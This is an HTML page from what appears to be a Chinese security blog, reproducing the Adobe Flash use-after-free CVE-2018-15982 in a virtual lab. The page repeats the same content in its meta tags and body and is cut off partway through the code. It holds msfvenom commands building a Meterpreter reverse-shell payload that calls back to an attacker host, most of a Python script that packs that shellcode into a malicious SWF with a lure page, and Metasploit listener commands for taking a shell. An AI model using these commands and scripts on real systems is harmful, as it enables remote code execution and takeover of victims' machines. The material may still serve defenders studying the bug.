@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <title>【漏洞复现】 CNNVD-201812-167 Adobe Flash漏洞复现 – 今天又刷了什么水题 – 为者常成，行者常至</title>
+
+      <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="CNNVD-201812-167 Adobe Flash漏洞复现
+
+Adobe Flash Player中存在释放后重用漏洞。攻击者可利用该漏洞执行任意代码。以下产品和版本受到影响：基于Windows、macOS和Linux平台的Adobe Flash Player Desktop Runtime 31.0.0.153及之前版本，基于Windows、macOS、Linux和Chrome OS平台的Adobe Flash Player for Google Chrome 31.0.0.153及之前版本，基于Windows 10和8.1平台的Adobe Flash Player for Microsoft Edge和Internet Explorer 11 31.0.0.153及之前版本，基于Windows平台的Adobe Flash Player Installer 31.0.0.108及之前版本。
+
+漏洞的CNNVD网址
+
+复现环境配置详情
+
+
+  VMware Workstation 15
+  目标机：Windows7 SP1 + Flash Player ActiveX 31.0.0.108
+  攻击机：Kali 2019.02 + Metasploit5
+
+
+复现过程
+
+
+  
+    使用Metasploit生成payload程序
+
+    这里要记住设置的RC4PASSWORD，后面监听的时候要用到，LHOST就是kali的IP地址，LPORT是后面要用到的监听端口。执行之后生成两个文件64.bin和86.bin
+  
+
+
+msfvenom -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=yourPWD LHOST=192.168.40.128 LPORT=5002 -f raw &gt; 86.bin
+msfvenom -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=yourPWD LHOST=192.168.40.128 LPORT=5002 -f raw &gt; 64.bin
+
+
+
+  执行下面的漏洞利用脚本，生成swf文件和一个简单的网站首页index.html。命令为 python CVE_2018_15982.py -i 86.bin -I 64.bin
+
+
+
+
+def hex2char(data):
+	output = data.strip().decode('hex')
+	return output
+def char2hex(data):
+	output = data.encode('hex')
+	return output
+
+def repair(data):
+	while len(data)/2 % 4 != 0:
+		data = data + "00"
+	return data
+
+def genexp(file,sfile,out):
+	f = open(file, 'rb')
+	data = f.read()
+	tmp = char2hex(data)
+	f.close()
+	g = open(sfile,'rb')
+	sdata = g.read()
+	stmp = char2hex(sdata)
+	g.close()
+	tmp = repair(tmp)
+	stmp = repair(stmp)
+	binary_data_len = len(tmp)/2
+	binary_data_len2 = len(stmp)/2
+	exptmp = data1 + generate_definebinarydata_tag(0x01, binary_data_len)+ tmp + generate_definebinarydata_tag(0x02, binary_data_len2) + stmp + data2
+	swflen = struct.pack('I',len(exptmp)/2).encode('hex') 
+	expfina = exptmp.replace('fdfefcfb',swflen,1)
+	writeout(out, expfina)
+
+def writeout(file,data):
+	f = open(file, "wb")
+	f.write(hex2char(data))
+	f.close()
+
+'''
+   1	1.1	  2	  3		4	
+"ff15 1d010000 0200 00000000   xxxxxx"
+1: 		tag_code_and_length_16
+1.1: 	length_32, exist only if size of payload is more than or equal to 0x3F.
+2: 		data_id_16
+3: 		reserved_32, always be 00000000
+4: 		payload data
+'''
+
+def generate_definebinarydata_tag(data_id, binary_data_len):
+	tag_code_and_length_16 = struct.pack('h', ((0x57 &lt;&lt; 6) | 0x3F)).encode('hex')
+	length_32 = ''
+	data_id_16 = struct.pack('h', data_id).encode('hex')
+	reserved_32 = struct.pack('I', 0).encode('hex')
+	if binary_data_len &gt;= 0x3F:
+		length_32 = struct.pack('I', binary_data_len + 6).encode('hex')
+	else:
+		tag_code_and_length_16 = struct.pack('h', (0x57 &lt;&lt; 6) | binary_data_len).encode('hex')
+	return tag_code_and_length_16 + length_32 + data_id_16 + reserved_32
+	
+if __name__ == '__main__':
+	print LOGO
+	parser = argparse.ArgumentParser(description="exp for CVE-2018-15982")
+	parser.add_argument(
+			"-i", "--bin", help="Input MSF x86 shellcode.bin", required=True)
+	parser.add_argument(
+			"-I", "--sbin", help="Input MSF x64 shellcode.bin", required=True)
+	parser.add_argument(
+		'-o', "--output", help="Output exploit swf and index.html", default="exploit.swf",required=False)
+	args = parser.parse_args()
+	genexp(args.bin,args.sbin,args.output)
+	html = """
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+	&lt;meta charset="utf-8"/&gt;
+	&lt;title&gt;CVE-2018-15982 Exploit&lt;/title&gt;
+	&lt;meta name="description" content="" /&gt;
+	&lt;style&gt;
+		html, body { height:100%; overflow:hidden; }
+		body { margin:0; }
+	&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;div id="altContent"&gt;
+		&lt;h1&gt;CVE-2018-15982(Flash Exploit)&lt;/h1&gt;
+	&lt;/div&gt;
+	""" + "&lt;embed src=\"" + args.output +  "\"&gt;&lt;/embed&gt;" + """
+&lt;/body&gt;
+&lt;/html&gt;
+"""
+	f = open("index.html", "wb")
+	f.write(html)
+	f.close()
+	print "[*] Done ! output file --&gt; " + args.output
+	print "[*] Done ! output file --&gt; index.html"
+
+
+
+  利用Python的SimpleHTTPServer模块开启一个简单的服务器，命令为：python -m SimpleHTTPServer 8110
+
+
+
+
+
+  在Kali终端中输入以下命令来开启监听
+
+
+use ecploit/multi/handler
+set payload windows/meterpreter/reverse_tcp_rc4
+set RC4PASSWORD yourPWD
+set LHOST 192.168.40.128
+set LPORT 5002
+exploit
+
+
+
+
+
+  
+    在windows中打开IE浏览器访问服务器http://192.168.40.128:8110
+  
+  
+    几秒钟后Kali监听到会话
+  
+
+
+
+
+
+  在msf中输入shell拿到shell
+
+
+
+
+
+  接下来就可以执行各种命令了，如ipconfig或者弹计算器（。
+
+
+
+
+危害分析
+
+该漏洞位于TVSDK内Metadata类的setObject函数，setObject在将String类型（属于RCObject）对象保存到Metadata类对象的keySet成员时，没有使用DRCWB（Deferred ReferenceCounted, with Write Barrier）。攻击者利用这一点，通过强制GC获得一个悬垂指针，在此基础上通过多次UAF进行多次类型混淆，随后借助两个自定义类的交互操作实现任意地址读写，在此基础上泄露ByteArray的虚表指针，从而绕过ASLR，最后借助HackingTeam泄露代码中的方式绕过DEP/CFG，执行shellcode。属于0day漏洞，危害性极高。
+" />
+    <meta property="og:description" content="CNNVD-201812-167 Adobe Flash漏洞复现
+
+Adobe Flash Player中存在释放后重用漏洞。攻击者可利用该漏洞执行任意代码。以下产品和版本受到影响：基于Windows、macOS和Linux平台的Adobe Flash Player Desktop Runtime 31.0.0.153及之前版本，基于Windows、macOS、Linux和Chrome OS平台的Adobe Flash Player for Google Chrome 31.0.0.153及之前版本，基于Windows 10和8.1平台的Adobe Flash Player for Microsoft Edge和Internet Explorer 11 31.0.0.153及之前版本，基于Windows平台的Adobe Flash Player Installer 31.0.0.108及之前版本。
+
+漏洞的CNNVD网址
+
+复现环境配置详情
+
+
+  VMware Workstation 15
+  目标机：Windows7 SP1 + Flash Player ActiveX 31.0.0.108
+  攻击机：Kali 2019.02 + Metasploit5
+
+
+复现过程
+
+
+  
+    使用Metasploit生成payload程序
+
+    这里要记住设置的RC4PASSWORD，后面监听的时候要用到，LHOST就是kali的IP地址，LPORT是后面要用到的监听端口。执行之后生成两个文件64.bin和86.bin
+  
+
+
+msfvenom -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=yourPWD LHOST=192.168.40.128 LPORT=5002 -f raw &gt; 86.bin
+msfvenom -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=yourPWD LHOST=192.168.40.128 LPORT=5002 -f raw &gt; 64.bin
+
+
+
+  执行下面的漏洞利用脚本，生成swf文件和一个简单的网站首页index.html。命令为 python CVE_2018_15982.py -i 86.bin -I 64.bin
+
+
+
+
+def hex2char(data):
+	output = data.strip().decode('hex')
+	return output
+def char2hex(data):
+	output = data.encode('hex')
+	return output
+
+def repair(data):
+	while len(data)/2 % 4 != 0:
+		data = data + "00"
+	return data
+
+def genexp(file,sfile,out):
+	f = open(file, 'rb')
+	data = f.read()
+	tmp = char2hex(data)
+	f.close()
+	g = open(sfile,'rb')
+	sdata = g.read()
+	stmp = char2hex(sdata)
+	g.close()
+	tmp = repair(tmp)
+	stmp = repair(stmp)
+	binary_data_len = len(tmp)/2
+	binary_data_len2 = len(stmp)/2
+	exptmp = data1 + generate_definebinarydata_tag(0x01, binary_data_len)+ tmp + generate_definebinarydata_tag(0x02, binary_data_len2) + stmp + data2
+	swflen = struct.pack('I',len(exptmp)/2).encode('hex') 
+	expfina = exptmp.replace('fdfefcfb',swflen,1)
+	writeout(out, expfina)
+
+def writeout(file,data):
+	f = open(file, "wb")
+	f.write(hex2char(data))
+	f.close()
+
+'''
+   1	1.1	  2	  3		4	
+"ff15 1d010000 0200 00000000   xxxxxx"
+1: 		tag_code_and_length_16
+1.1: 	length_32, exist only if size of payload is more than or equal to 0x3F.
+2: 		data_id_16
+3: 		reserved_32, always be 00000000
+4: 		payload data
+'''
+
+def generate_definebinarydata_tag(data_id, binary_data_len):
+	tag_code_and_length_16 = struct.pack('h', ((0x57 &lt;&lt; 6) | 0x3F)).encode('hex')
+	length_32 = ''
+	data_id_16 = struct.pack('h', data_id).encode('hex')
+	reserved_32 = struct.pack('I', 0).encode('hex')
+	if binary_data_len &gt;= 0x3F:
+		length_32 = struct.pack('I', binary_data_len + 6).encode('hex')
+	else:
+		tag_code_and_length_16 = struct.pack('h', (0x57 &lt;&lt; 6) | binary_data_len).encode('hex')
+	return tag_code_and_length_16 + length_32 + data_id_16 + reserved_32
+	
+if __name__ == '__main__':
+	print LOGO
+	parser = argparse.ArgumentParser(description="exp for CVE-2018-15982")
+	parser.add_argument(
+			"-i", "--bin", help="Input MSF x86 shellcode.bin", required=True)
+	parser.add_argument(
+			"-I", "--sbin", help="Input MSF x64 shellcode.bin", required=True)
+	parser.add_argument(
+		'-o', "--output", help="Output exploit swf and index.html", default="exploit.swf",required=False)
+	args = parser.parse_args()
+	genexp(args.bin,args.sbin,args.output)
+	html = """
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+	&lt;meta charset="utf-8"/&gt;
+	&lt;title&gt;CVE-2018-15982 Exploit&lt;/title&gt;
+	&lt;meta name="description" content="" /&gt;
+	&lt;style&gt;
+		html, body { height:100%; overflow:hidden; }
+		body { margin:0; }
+	&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;div id="altContent"&gt;
+		&lt;h1&gt;CVE-2018-15982(Flash Exploit)&lt;/h1&gt;
+	&lt;/div&gt;
+	""" + "&lt;embed src=\"" + args.output +  "\"&gt;&lt;/embed&gt;" + """
+&lt;/body&gt;
+&lt;/html&gt;
+"""
+	f = open("index.html", "wb")
+	f.write(html)
+	f.close()
+	print "[*] Done ! output file --&gt; " + args.output
+	print "[*] Done ! output file --&gt; index.html"
+
+
+
+  利用Python的SimpleHTTPServer模块开启一个简单的服务器，命令为：python -m SimpleHTTPServer 8110
+
+
+
+
+
+  在Kali终端中输入以下命令来开启监听
+
+
+use ecploit/multi/handler
+set payload windows/meterpreter/reverse_tcp_rc4
+set RC4PASSWORD yourPWD
+set LHOST 192.168.40.128
+set LPORT 5002
+exploit
+
+
+
+
+
+  
+    在windows中打开IE浏览器访问服务器http://192.168.40.128:8110
+  
+  
+    几秒钟后Kali监听到会话
+  
+
+
+
+
+
+  在msf中输入shell拿到shell
+
+
+
+
+
+  接下来就可以执行各种命令了，如ipconfig或者弹计算器（。
+
+
+
+
+危害分析
+
+该漏洞位于TVSDK内Metadata类的setObject函数，setObject在将String类型（属于RCObject）对象保存到Metadata类对象的keySet成员时，没有使用DRCWB（Deferred ReferenceCounted, with Write Barrier）。攻击者利用这一点，通过强制GC获得一个悬垂指针，在此基础上通过多次UAF进行多次类型混淆，随后借助两个自定义类的交互操作实现任意地址读写，在此基础上泄露ByteArray的虚表指针，从而绕过ASLR，最后借助HackingTeam泄露代码中的方式绕过DEP/CFG，执行shellcode。属于0day漏洞，危害性极高。
+" />
+    
+    <meta name="author" content="今天又刷了什么水题" />
+
+    
+    <meta property="og:title" content="【漏洞复现】 CNNVD-201812-167 Adobe Flash漏洞复现" />
+    <meta property="twitter:title" content="【漏洞复现】 CNNVD-201812-167 Adobe Flash漏洞复现" />
+    
+  <!-- Async font loading -->
+<script>
+  window.WebFontConfig = {
+      custom: {
+          families: ['Spoqa Han Sans:100,300,400,700'],
+          urls: ['https://spoqa.github.io/spoqa-han-sans/css/SpoqaHanSans-kr.css']
+      },
+      timeout: 60000
+  };
+  (function(d) {
+      var wf = d.createElement('script'), s = d.scripts[0];
+      wf.src = 'https://ajax.googleapis.com/ajax/libs/webfont/1.5.18/webfont.js';
+      s.parentNode.insertBefore(wf, s);
+  })(document);
+</script>
+
+<!--adobe fonts-->
+<script>
+    (function(d) {
+      var config = {
+        kitId: 'vbt3gjx',
+        scriptTimeout: 3000,
+        async: true
+      },
+      h=d.documentElement,t=setTimeout(function(){h.className=h.className.replace(/\bwf-loading\b/g,"")+" wf-inactive";},config.scriptTimeout),tk=d.createElement("script"),f=false,s=d.getElementsByTagName("script")[0],a;h.className+=" wf-loading";tk.src='https://use.typekit.net/'+config.kitId+'.js';tk.async=true;tk.onload=tk.onreadystatechange=function(){a=this.readyState;if(f||a&&a!="complete"&&a!="loaded")return;f=true;clearTimeout(t);try{Typekit.load(config)}catch(e){}};s.parentNode.insertBefore(tk,s)
+    })(document);
+</script> 
+
+  <!--[if lt IE 9]>
+    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+  <![endif]-->
+
+  <link rel="stylesheet" type="text/css" href="/style.css" />
+  <link rel="alternate" type="application/rss+xml" title="今天又刷了什么水题 - 为者常成，行者常至" href="/feed.xml" />
+  <link rel="shortcut icon" href="/favicon.ico">
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+  <script src="https://unpkg.com/feather-icons"></script>
+  <script type="text/javascript" async
+  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$','$']]
+      }
+    });
+  </script>
+
+  <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+
+</head>
+
+  <body>
+    <div class="wrapper-sidebar">
+  <header class="sidebar clearfix">
+    <div class="site-info">
+      
+        <a href="/" class="site-avatar"><img src="/logo.jpg" /></a>
+       
+      <h1 class="site-name"><a href="/">今天又刷了什么水题</a></h1>
+      <p class="site-description">为者常成，行者常至</p>
+    </div>
+  </header>
+
+  <div class="navlist">
+    <nav>
+      
+      
+      <a href="/">首页</a>
+      
+      
+      
+      <a href="/about">关于</a>
+      
+      
+      
+      <a href="/archive">归档</a>
+      
+      
+      
+      <a href="/tags">标签</a>
+      
+      
+      
+      <a href="/categories">分类</a>
+      
+      
+    </nav>
+  </div>
+
+  <div class="wrapper-footer-desktop">
+    <footer class="footer">
+      <!-- Refer to https://codepen.io/ruandre/pen/howFi -->
+<ul class="svg-icon">
+
+  
+  
+  
+
+  
+
+  
+  <li><a href="mailto:hiter_sun@163.com" class="icon-8 email" title="Email"><svg viewBox="0 0 512 512"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"/></svg><!--[if lt IE 9]><em>Email</em><![endif]--></a></li>
+  
+
+  
+
+  
+
+  
+  <li><a href="https://github.com/suniven" class="icon-13 github" title="GitHub"><svg viewBox="0 0 512 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg><!--[if lt IE 9]><em>GitHub</em><![endif]--></a></li>
+  
+
+  
+
+  
+
+  
+
+  
+  <li><a href="/feed.xml" class="icon-21 rss" title="RSS"><svg viewBox="0 0 512 512"><path d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM112 416c-26.51 0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm157.533 0h-34.335c-6.011 0-11.051-4.636-11.442-10.634-5.214-80.05-69.243-143.92-149.123-149.123-5.997-.39-10.633-5.431-10.633-11.441v-34.335c0-6.535 5.468-11.777 11.994-11.425 110.546 5.974 198.997 94.536 204.964 204.964.352 6.526-4.89 11.994-11.425 11.994zm103.027 0h-34.334c-6.161 0-11.175-4.882-11.427-11.038-5.598-136.535-115.204-246.161-251.76-251.76C68.882 152.949 64 147.935 64 141.774V107.44c0-6.454 5.338-11.664 11.787-11.432 167.83 6.025 302.21 141.191 308.205 308.205.232 6.449-4.978 11.787-11.432 11.787z"/></svg><!--[if lt IE 9]><em>RSS</em><![endif]--></a></li>
+  
+
+  
+
+  
+
+  
+
+  
+
+</ul>
+
+
+
+<p>Copyright (c) 2019-2021 From Gotei13 12th Div.</p>
+
+    </footer>
+  </div>
+</div>
+
+    
+      <aside class="toc">
+        <ul>
+  <li><a href="#">【漏洞复现】 CNNVD-201812-167 Adobe Flash漏洞复现</a>
+    <ul>
+      <li><a href="#复现环境配置详情">复现环境配置详情</a></li>
+      <li><a href="#复现过程">复现过程</a></li>
+      <li><a href="#危害分析">危害分析</a></li>
+    </ul>
+  </li>
+</ul>
+      </aside>
+    
+
+    <div id="main" role="main" class="wrapper-content">
+      <div class="container">
+        <article class="posts">
+  <h1>【漏洞复现】 CNNVD-201812-167 Adobe Flash漏洞复现</h1>
+
+  <div clsss="meta">
+    <span class="author">
+      Sun
+    </span>
+
+    <span class="date">
+      2020-06-13
+    </span>
+
+    <ul class="tag">
+      
+      <li>
+        <a href="/tags#漏洞复现">
+          漏洞复现
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags#Metasploit">
+          Metasploit
+        </a>
+      </li>
+      
+    </ul>
+  </div>
+
+  <div class="entry">
+    <p>CNNVD-201812-167 Adobe Flash漏洞复现</p>
+
+<p>Adobe Flash Player中存在释放后重用漏洞。攻击者可利用该漏洞执行任意代码。以下产品和版本受到影响：基于Windows、macOS和Linux平台的Adobe Flash Player Desktop Runtime 31.0.0.153及之前版本，基于Windows、macOS、Linux和Chrome OS平台的Adobe Flash Player for Google Chrome 31.0.0.153及之前版本，基于Windows 10和8.1平台的Adobe Flash Player for Microsoft Edge和Internet Explorer 11 31.0.0.153及之前版本，基于Windows平台的Adobe Flash Player Installer 31.0.0.108及之前版本。</p>
+
+<p><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201812-167">漏洞的CNNVD网址</a></p>
+
+<h2 id="复现环境配置详情">复现环境配置详情</h2>
+
+<ul>
+  <li>VMware Workstation 15</li>
+  <li>目标机：Windows7 SP1 + Flash Player ActiveX 31.0.0.108</li>
+  <li>攻击机：Kali 2019.02 + Metasploit5</li>
+</ul>
+
+<h2 id="复现过程">复现过程</h2>
+
+<ul>
+  <li>
+    <p>使用Metasploit生成payload程序</p>
+
+    <p>这里要记住设置的RC4PASSWORD，后面监听的时候要用到，LHOST就是kali的IP地址，LPORT是后面要用到的监听端口。执行之后生成两个文件64.bin和86.bin</p>
+  </li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp_rc4 <span class="nv">RC4PASSWORD</span><span class="o">=</span>yourPWD <span class="nv">LHOST</span><span class="o">=</span>192.168.40.128 <span class="nv">LPORT</span><span class="o">=</span>5002 <span class="nt">-f</span> raw <span class="o">&gt;</span> 86.bin
+msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp_rc4 <span class="nv">RC4PASSWORD</span><span class="o">=</span>yourPWD <span class="nv">LHOST</span><span class="o">=</span>192.168.40.128 <span class="nv">LPORT</span><span class="o">=</span>5002 <span class="nt">-f</span> raw <span class="o">&gt;</span> 64.bin
+</code></pre></div></div>
+
+<ul>
+  <li>执行下面的漏洞利用脚本，生成swf文件和一个简单的网站首页index.html。命令为 <code class="language-plaintext highlighter-rouge">python CVE_2018_15982.py -i 86.bin -I 64.bin</code></li>
+</ul>
+
+<p><img src="/assets/images/md/vul/Snipaste_05_13-32-22.png" alt="" /></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">hex2char</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+	<span class="n">output</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+	<span class="k">return</span> <span class="n">output</span>
+<span class="k">def</span> <span class="nf">char2hex</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+	<span class="n">output</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+	<span class="k">return</span> <span class="n">output</span>
+
+<span class="k">def</span> <span class="nf">repair</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+	<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+		<span class="n">data</span> <span class="o">=</span> <span class="n">data</span> <span class="o">+</span> <span class="s">"00"</span>
+	<span class="k">return</span> <span class="n">data</span>
+
+<span class="k">def</span> <span class="nf">genexp</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span><span class="n">sfile</span><span class="p">,</span><span class="n">out</span><span class="p">):</span>
+	<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+	<span class="n">tmp</span> <span class="o">=</span> <span class="n">char2hex</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+	<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+	<span class="n">g</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sfile</span><span class="p">,</span><span class="s">'rb'</span><span class="p">)</span>
+	<span class="n">sdata</span> <span class="o">=</span> <span class="n">g</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+	<span class="n">stmp</span> <span class="o">=</span> <span class="n">char2hex</span><span class="p">(</span><span class="n">sdata</span><span class="p">)</span>
+	<span class="n">g</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+	<span class="n">tmp</span> <span class="o">=</span> <span class="n">repair</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+	<span class="n">stmp</span> <span class="o">=</span> <span class="n">repair</span><span class="p">(</span><span class="n">stmp</span><span class="p">)</span>
+	<span class="n">binary_data_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span>
+	<span class="n">binary_data_len2</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">stmp</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span>
+	<span class="n">exptmp</span> <span class="o">=</span> <span class="n">data1</span> <span class="o">+</span> <span class="n">generate_definebinarydata_tag</span><span class="p">(</span><span class="mh">0x01</span><span class="p">,</span> <span class="n">binary_data_len</span><span class="p">)</span><span class="o">+</span> <span class="n">tmp</span> <span class="o">+</span> <span class="n">generate_definebinarydata_tag</span><span class="p">(</span><span class="mh">0x02</span><span class="p">,</span> <span class="n">binary_data_len2</span><span class="p">)</span> <span class="o">+</span> <span class="n">stmp</span> <span class="o">+</span> <span class="n">data2</span>
+	<span class="n">swflen</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'I'</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">exptmp</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span> 
+	<span class="n">expfina</span> <span class="o">=</span> <span class="n">exptmp</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'fdfefcfb'</span><span class="p">,</span><span class="n">swflen</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">writeout</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">expfina</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">writeout</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
+	<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
+	<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">hex2char</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+	<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="s">'''
+   1	1.1	  2	  3		4	
+"ff15 1d010000 0200 00000000   xxxxxx"
+1: 		tag_code_and_length_16
+1.1: 	length_32, exist only if size of payload is more than or equal to 0x3F.
+2: 		data_id_16
+3: 		reserved_32, always be 00000000
+4: 		payload data
+'''</span>
+
+<span class="k">def</span> <span class="nf">generate_definebinarydata_tag</span><span class="p">(</span><span class="n">data_id</span><span class="p">,</span> <span class="n">binary_data_len</span><span class="p">):</span>
+	<span class="n">tag_code_and_length_16</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'h'</span><span class="p">,</span> <span class="p">((</span><span class="mh">0x57</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x3F</span><span class="p">)).</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+	<span class="n">length_32</span> <span class="o">=</span> <span class="s">''</span>
+	<span class="n">data_id_16</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'h'</span><span class="p">,</span> <span class="n">data_id</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+	<span class="n">reserved_32</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'I'</span><span class="p">,</span> <span class="mi">0</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
